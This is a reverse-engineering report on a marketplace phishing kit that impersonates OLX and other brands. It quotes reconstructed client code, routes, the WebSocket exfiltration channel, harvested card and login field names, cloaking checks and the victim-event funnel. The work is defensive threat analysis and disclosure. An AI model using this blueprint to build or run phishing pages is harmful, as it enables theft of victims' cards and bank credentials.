# KIT CODE ANALYSIS — Reverse-Engineering Teardown
**Companion to `FULL_OPERATION_DOSSIER_marketplace_phishing.md`.** Every item here is read **directly from the kit's own client JavaScript** and quoted literally — confidence **[H]** throughout.

- **Compiled:** 2026-06-15 (UTC).
- **Source:** the kit's client bundle, recovered from urlscan's stored response bodies (scans `019ec607` = olx.paycore24-express.sbs, `019ecbd3` = olx.express-paycore24.cyou) → fetched via `https://urlscan.io/responses/<sha256>/` → brotli/gzip-decompressed. Working copies + hashes: **`kit-source/raw_bodies/`** (72 raw) and **`kit-source/decompressed/`** (decompressed, with `SHA256SUMS.txt`).
- **Method:** static analysis of decompressed JS. Snippets below are reconstructed from minified code; **all endpoint/string literals are preserved verbatim**.

---

## 1. Build & framework
- **Next.js 16.2.7** (App Router) bundled with **Turbopack** (production build), **React 19.2.7**, **Emotion** (CSS-in-JS), split into **~70 JS chunks** + a CSS chunk. Exact version is literal in the bundle: `next@16.2.7`, `react@19.2.7`, `react-dom@19.2.7`.
- Server-rendered HTML shell (`<div id="site-root">`) hydrated client-side; per-victim content fetched at runtime.
- A leftover **`ws://localhost:5002` / `http://localhost:5002`** dev fallback (see §12) shows a normal local-dev → build → deploy pipeline.

## 2. Entry & per-victim token
Entry URL: `https://<brand>.<domain>.<tld>/a/<base64token>?us=<channel>`.
The client base64-decodes the token (`atob`) to `2/<id>`:
```
"Mi8zRFdpNjBQbmFS"  → atob →  "2/3DWi60PnaR"
"Mi9XT0tHSjNwUjk0"  → atob →  "2/WOKGJ3pR94"
"Mi9mNGY2blplM1E4"  → atob →  "2/f4f6nZe3Q8"
```
- `2/` = kit stage/version constant; `<id>` = the per-victim backend record key (item, price, fake buyer, address, order ID).
- `?us=` = delivery-channel tag (`gm | dlm | sml | ym`).
The decoded `<id>` + brand are then used to load the victim page (see §3).

## 3. Route map (victim-facing) — live-confirmed
| Route | Purpose |
|---|---|
| `/a/<token>` | lure entry |
| `/helpdesk/<decoded-id>/<brand>` | personalised fake listing, loaded in an iframe: `src=\`/helpdesk/${e}/${n}\`` (e=decoded id, n=brand, e.g. `/helpdesk/f4f6nZe3Q8/olx`) |
| `/m/<token>/<service_method>` | **card-capture module** (see §7) — e.g. `/m/<token>/c3RyaXBl` (`c3RyaXBl`=`stripe`) |
| `/cdn/<32-hex>` | static assets |
| `/static/helpdesk/audio/*.mp3` | chat notification sounds (`blackberry.mp3`) |
| `/api/v1/storage/<date>/<asset>` | baked-in brand template docs (§10) |
| `/geoip` (→ `api.ip.sb`) | cloak/geo check (§9) |
| `/api/ws/stripe/sync`, `/api/ws/sync`, `/ws/helpdesk` | WebSockets (§6) |
| `/` | returns **404** (not crawlable) |

## 4. Transport base-URL derivation (the C2 is same-origin)
```js
D = () => (window ? window.location.hostname : "")
T = a => a.includes("localhost") || a.includes("127.0.0.1") || a.includes("0.0.0.0")

getWsBaseUrl  = () => { let a = D(); return (!a || T(a)) ? (env.WS_BASE_URL  ?? "ws://localhost:5002")   : `wss://${a}` }
getApiBaseUrl = () => { let a = D(); return (!a || T(a)) ? (env.API_BASE_URL ?? "http://localhost:5002") : `https://${a}` }

normalizeToWs = d =>
  d.startsWith("http://")  ? d.replace("http://","ws://")  :
  d.startsWith("https://") ? d.replace("https://","wss://") : d
```
**Meaning:** in production the exfil host is just the page's own hostname over `wss://` — **the C2 is self-hosted on the phishing domain** (Cloudflare-fronted). `WS_BASE_URL`/`API_BASE_URL` are build-time env overrides; the `localhost:5002` fallback is the developer's machine.

## 5. The reconnecting WebSocket client (`WebSocketProvider`)
Key members (verbatim names): `manualClose`, `setStatus(...)` (states `connecting`/`error`/`closing`/`closed`), `computeNextDelay()` driven by a `backoffMs` array, `reconnectTimeoutId`, optional `protocols`, and the socket itself `new WebSocket(this.url[,this.protocols])`.
```js
// on socket close:
if (this.manualClose) { setStatus("closed"); return }   // honour intentional close
setStatus("error"); let d = this.computeNextDelay(); /* schedule reconnect */
// server-driven stop:
if (this.disconnectData?.reason) { /* "not reconnecting:", reason */ return }
```
→ A resilient, auto-reconnecting real-time channel; the **server can instruct the client to stop reconnecting** (`disconnectData.reason`).

## 6. The three channels + the helpdesk chat protocol
```js
// operator console:
init({ provider:"websocket", url:`${getWsBaseUrl()}/ws/helpdesk`,      params:{ ad_id:<id> } })
// card/payment relay:
init({ provider:"websocket", url:`${getWsBaseUrl()}/api/ws/stripe/sync`, params:{ ad_id:<id>, service_method:<...> } })
// state sync:
init({ provider:"websocket", url:`${getWsBaseUrl()}/api/ws/sync` })
```
**Helpdesk chat events** (`_.on("<event>")`) — a full bidirectional protocol:
`connected`, `disconnect`, `error`, `messages` (load history), `message_read`, `message_delete`, `send_message_result`, `open_helpdesk_widget`, `close_helpdesk_widget`.
→ The operator and victim exchange messages in real time; the operator can mark-read and **delete** messages and open/close the widget remotely. This is the live "Chat supporto / Operatore" seen in the screenshots.

**Wire protocol (passively extracted — no live connection made):**
- Transport: JSON frames — `socket.send(JSON.stringify(...))`.
- Primary telemetry message: `{ type:"ad:event", data:{ visor_id:"", ad_id:<id>, event_type:<EventType>, event_data:<payload> } }`.
- **`EventTypes` enum streams every victim action live** to the operator: `EnterFullNameEvent`, `EnterEmailInputEvent`, `EnterContactFormEvent`, … (card-entry events follow the same shape) → the operator **watches each field as it is typed**.
- Chat message frames: `type:"get_messages"`, `type:"helpdesk"`; rendered with markers `hd-message-client` / `hd-message-operator`; product display via `product-price-formatted` / `product-currency`.
- **Card schemes recognised in code:** visa/mastercard + `discover`, `elo`, `hiper`, `hipercard` (the last three are **Brazilian** card brands → confirms BR targeting / `stripe/br`).

## 7. Card capture & the payment module
- Route: **`/m/<token>/<service_method>`**, where `service_method` = **`stripe/<country>`**.
- **34 country variants** present in code: `at au be bg br ca ch cz de dk ee es fi fr gb hk hr hu is it lt lv md nl no nz pl pt ro se sg sk us`. → the kit tailors the (fake) Stripe flow per victim country.
- **Harvested field names (literal):** `card_number`, `card_cvv`, expiry, `billingName`, `billingCity`, `billingState`, `billingZipCode` (+ `login`, `password`, `phone`, `pin` from the credential step).
- Card data is **streamed over the `/api/ws/stripe/sync` WebSocket** (with `ad_id` + `service_method`), **not** an HTTP POST → real-time exfil to the operator.
- **No real Stripe is used client-side** — the bundle contains **no `js.stripe.com`, no `pk_live/pk_test` key, no `client_secret`/`payment_intent`/`confirmCardPayment`/Stripe Elements**. "Stripe" here is (1) **trust-brand theater** on the fake page and (2) an **internal label/router** (`service_method = stripe/<country>`). The kit captures the **raw PAN+CVV** and ships it to the operator — the exact opposite of what real Stripe does (tokenise so the merchant never sees the card). Any real charge happens on the operator's hidden backend (inference [M]).
- Service segment is UTF-8-safe base64: `/m/${token}/${btoa(unescape(encodeURIComponent(service)))}` → e.g. `c3RyaXBl` = `stripe`.

## 8. BIN lookup / bank tailoring
The kit enriches the stolen card via BIN-lookup services (literal): **`lookup.binlist.net`** and **`data.handyapi.com`** with path **`"/bin/"`**. → the card's first digits identify the issuing bank/country/scheme, so the kit can present the matching fake bank / 3-D-Secure screen and route by `stripe/<country>`.

## 9. Cloaking / geolocation
Client-side call to **`https://api.ip.sb/geoip`** returns the visitor's ip/city/region/country/asn — feeding the cloaking decision (residential vs datacenter, correct country) alongside the one-time token and real-browser check. Non-matching visitors get the benign decoy.

## 10. Brand templates, localization & storage
- **`/api/v1/storage/<date>/<asset>`** serves baked-in brand legal docs — recovered assets are **Romanian**: `Politica_de_confiden[tialitate]`, `Accesibilitate_subunitati_postale_2025`, plus `Cookies_…`.
- Full **`/ro/…` route tree** present (`/ro/landing/payment`, `/ro/info/{about,ad,apps,privacy-policy,recommendations,rules}`, `/ro/blog`, `/ro/sitemap`) → Romania fully localized.
- **Impersonated-brand portfolio** (hard-coded legit login/redirect URLs in the bundle): Allegro (PL), Bazar.bg (BG), Blocket + Bytbil (SE), iMarked/Finn (NO), Anibis + Tutti (CH), Laendleanzeiger (AT), TradeMe (NZ); postal/courier **Correos (ES), Posta Moldovei `posta.md` (MD), Balíkovna (CZ), SelfAWB/Posta Română (RO)**, OMNIVA; payment **Vipps MobilePay (NO/DK)** — consistent with the 34-country `stripe/<cc>` list. Marketplaces + postal + payment brands across Europe, plus AU/BR/CA/HK/SG/US/NZ.

## 11. Other third-party calls
- **`v2.simpalsid.com/graphql`** (POST) — Simpals/OLX identity API (credential relay/validation).
- **`nominatim.openstreetmap.org/reverse`** — reverse-geocoding the victim's location.
- **`cdn.jsdelivr.net/.../currency-api`** — currency conversion for the displayed price.

## 12. Notable artifacts / OPSEC slips
- **Dev fallback `ws://localhost:5002` / `http://localhost:5002`** — the kit author's local dev server (built with a real toolchain).
- **Cross-brand data leak** — a Polish product title ("Kolo sportiwne") rendered on an *Italian* Subito page → one shared engine/data-pool.
- **Reused fake-buyer identity** — "Arkadiusz Twardy / ul. Kruczkowskiego 79, Czeladź" appears across multiple OLX victims (scans `019ec607`, `019ecbd3`).

## 12b. Authorship & internal artifacts — RUSSIAN-language evidence [H]
The bundle contains **253 distinct Cyrillic strings** — not just lure text but a developer/operator **admin UI** and **fraud scripts**, establishing **Russian-speaking authorship** at code level.

**(a) Russian WYSIWYG page-builder admin panel** (operators design fake pages in Russian): `Панель настроек шаблона` ("Template settings panel") · `Загрузить лого`/`Заменить лого` ("Upload/Replace logo") · `Свой шрифт` ("Custom font") · `Цвет бренда` ("Brand color") · `Вариант шапки`/`подвала` ("Header/Footer variant") · `Скорость анимаций` ("Animation speed") · `Бейджи магазинов` ("Store badges") · `По-русски` (toggle "In Russian").

**(b) Operator fraud-script strings:** `Кредитные карты не принимаются. Используйте дебетовую карту.` = "Credit cards not accepted. Use a debit card." · `Карта отклонена` = "Card declined" · `логин банка` / `пароль банка` = "bank login / password" · `номер не проходит проверку Луна` = "fails Luhn check".

**(c) Versioned scam scenarios:** `Покупка (1.0)` = "Purchase 1.0", `Выплата (2.0)` = "Payout 2.0". The per-victim token prefix **`2/` = the "Выплата (payout) 2.0" scenario** (seller-payout scam) — this is what the `2/` in `base64⁻¹(token)` means.

**(d) Victim funnel — `EventTypes`, each streamed live to the operator:** `OpenTrafficLinkEvent → OpenPhishingEvent → EnterContactForm/Email/FullName/PhoneNumberBankPreloader → OpenLoginPageEvent → EnterLoginDataEvent → OpenLKPageEvent → EnterLKDataEvent` (LK = `личный кабинет`, "personal account") `→ OpenPaymentEvent → EnterPaymentCardDetailsEvent / EnterPaymentBlikDetailsEvent` (BLIK = Polish payments) `→ EnterVerifyDataEvent` (OTP/3-DS).

**(e) Localized victim lures:** Bulgarian (Bazar.bg) — `Вашите стоки вече са платени от купувача, парите се съхраняват от нашата услуга…` = "Your goods are already paid by the buyer, the money is held by our service…".

**(f) Misc:** components `WebSocketProvider`/`DialogIframe`/`VerifyMainBlock`; English debug logs (`Helpdesk WebSocket connected`) with Russian business strings; localStorage persists harvested PII (`fullName`,`email`,`phone`,`contactForm`,`HD_LAST_STATE`,`redirect_link_temporary`); brand-template paths `/app/anibis-ch-…`, `/app/correos-info/…`, `/app/fan-courier-mobile/…`, `/app/gumtree/…`, `bpost-locale`, `ups-locale`.

**Conclusion:** developers/operators are **Russian-speaking** (code-level, not inference) — the **Classiscam/Telekopye** profile. The kit is a productized, versioned, multi-language **page builder**, not a one-off page.

## 13. Endpoint reference (quick table)
| Endpoint | Type | Purpose |
|---|---|---|
| `/a/<base64token>?us=<ch>` | page | lure entry (token→`2/<id>`) |
| `/helpdesk/<id>/<brand>` | page (iframe) | personalised fake listing |
| `/m/<token>/stripe/<cc>` | page | card-capture module (per-country) |
| `/cdn/<hash>` | asset | kit assets |
| `/static/helpdesk/audio/*.mp3` | asset | chat sounds |
| `/api/v1/storage/<date>/<asset>` | api | brand template docs |
| `wss://<host>/ws/helpdesk` | websocket | operator↔victim chat/control |
| `wss://<host>/api/ws/stripe/sync` | websocket | **card-data exfil** |
| `wss://<host>/api/ws/sync` | websocket | state sync |
| `api.ip.sb/geoip` | 3rd-party | cloak/geo check |
| `lookup.binlist.net`, `data.handyapi.com/bin/` | 3rd-party | BIN→bank |
| `v2.simpalsid.com/graphql` | 3rd-party | OLX/Simpals auth relay |
| `nominatim.openstreetmap.org` | 3rd-party | reverse geocode |
| `cdn.jsdelivr.net` currency-api | 3rd-party | price currency |

## 14. Evidence & integrity
- Decompressed source: `kit-source/decompressed/` (+ `SHA256SUMS.txt`); raw bodies: `kit-source/raw_bodies/`.
- Rendered captures/screenshots: `screenshots/019ec607-….png`, `019ecbd3-….png`.
- Every endpoint/field/event above is a literal string from the bundle; nothing inferred is presented as code. The **operator console** is the authenticated peer of `/ws/helpdesk`; its admin/login URL is **not** present in the client code (separate, Cloudflare-hidden infra → obtainable via a Cloudflare abuse / legal-disclosure request).
